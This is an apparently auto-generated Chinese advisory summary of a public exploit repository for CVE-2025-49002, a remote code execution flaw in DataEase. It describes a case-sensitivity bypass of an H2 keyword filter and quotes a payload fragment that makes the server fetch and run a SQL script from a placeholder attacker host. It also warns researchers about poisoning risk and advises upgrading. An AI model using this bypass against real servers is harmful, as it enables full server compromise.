## CVE-2025-49002-DataEase-RCE

**漏洞编号:** CVE-2025-49002

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** DataEase

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 2.10.10

**利用条件:** 需要DataEase服务可访问，并且目标系统未打CVE-2025-49002补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-49002是DataEase的一个H2数据库RCE绕过漏洞。该漏洞是CVE-2025-32966补丁的绕过，因为补丁对`INIT`和`RUNSCRIPT`关键字的过滤是大小写敏感的。攻击者可以通过修改大小写来绕过补丁。 

**漏洞利用方式：**

攻击者通过构造恶意的HTTP POST请求到`/de2api/datasource/validate`端点，其中包含恶意的H2数据库连接配置。该配置中的`INIT`参数被设置为从远程服务器加载并执行SQL脚本，从而导致远程代码执行。

具体来说，攻击者修改`configuration`字段，使用`RUNSCRIPT FROM 'http://your-vps:2333/poc.sql'`。 DataEase会尝试连接到该URL并执行其中的SQL语句。通过精心构造`poc.sql`，攻击者可以执行任意系统命令。

**有效性：**

提供的POC代码有效。`poc.py`脚本通过发送精心构造的POST请求来触发漏洞。它首先尝试访问目标URL, 然后发送包含恶意H2配置的JSON数据到`/de2api/datasource/validate`端点。如果DataEase实例存在漏洞，则会执行远程SQL脚本，导致RCE。

**投毒风险：**

该仓库可能存在一定的投毒风险。风险点在于`poc.sql`的内容。虽然代码本身没有直接的恶意行为，但它指示用户从`http://your-vps:2333/poc.sql`下载脚本并执行。如果攻击者控制了该服务器，他们可以提供恶意的`poc.sql`脚本，导致漏洞利用者受到攻击。

该风险较高，建议漏洞研究员应自行搭建服务器，并检查poc.sql中的内容，确认其安全性后，再进行测试验证。

代码中 `X-DE-TOKEN`  为硬编码，可能无法直接使用，需要自行获取或修改。

**总结：**

该漏洞危害程度高，利用方式简单，但存在一定的投毒风险，需要谨慎使用。建议及时更新DataEase版本到2.10.10或更高版本，以修复此漏洞。

**项目地址:** [Feng-Huang-0520/DataEase_Postgresql_JDBC_Bypass-CVE-2025-49002](https://github.com/Feng-Huang-0520/DataEase_Postgresql_JDBC_Bypass-CVE-2025-49002)

**漏洞详情:** [CVE-2025-49002](https://nvd.nist.gov/vuln/detail/CVE-2025-49002)